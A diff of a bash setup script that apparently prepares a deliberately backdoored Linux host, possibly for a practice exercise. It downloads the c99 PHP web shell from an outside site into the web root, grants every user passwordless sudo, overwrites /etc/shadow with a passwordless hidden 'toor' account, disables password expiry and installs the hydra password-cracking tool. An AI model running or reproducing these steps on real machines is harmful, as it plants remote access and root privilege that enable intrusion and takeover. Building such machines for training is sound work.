@@ -1,14 +1,15 @@
 #!/bin/bash
 
+apt-get install -y python-dev
 # Backdoor
-apt-get install apache2 apache2-npm php5
-wget -O /var/www/c99.php wget http://r57shell.net/shell/c99.txt
+apt-get install -y apache2 php5
+wget -O /var/www/c99.php wget http://blog.zer0w1re.net/files/c99.txt
 
 # Sudoers
 echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/all
 
 # Max PW age
-sed -i 's/^PASS_MAX_AGE/PASS_MAX_AGE\t99999' /etc/login.defs
+sed -i 's/^PASS_MAX_AGE/PASS_MAX_AGE\t99999/g' /etc/login.defs
 
 # Hidden user
 echo "toor::16426:0:99999:7:::" > /etc/shadow
@@ -27,28 +28,23 @@ useradd -d /home/alex alex
 useradd -d /home/connor connor
 useradd -d /home/andrew andrew
 
-# Install hydra
-git clone https://github.com/vanhauser-thc/thc-hydra.git
-./thc-hydra/configure
-./thc-hydra/make
-./thc-hydra/make install
-rm -rf thc-hydra
-which hydra
+# install hydra
+apt-get install -y hydra
 
-# Install ssh
-apt-get install openssh-server
+# install ssh
+apt-get install -y openssh-server
 
 # Script dependencies
 wget https://pypi.python.org/packages/source/s/simplepam/simplepam-0.1.5.tar.gz
 tar xvf simplepam-0.1.5.tar.gz
 cd simplepam-0.1.5
-python setup.py install
+python setup.py install -y
 cd ..
 rm -rf simplepam-0.1.5
 
 git clone https://github.com/giampaolo/psutil.git
 cd psutil
-python setup.py install
+python setup.py install -y
 cd ..
 rm -rf psutil
 
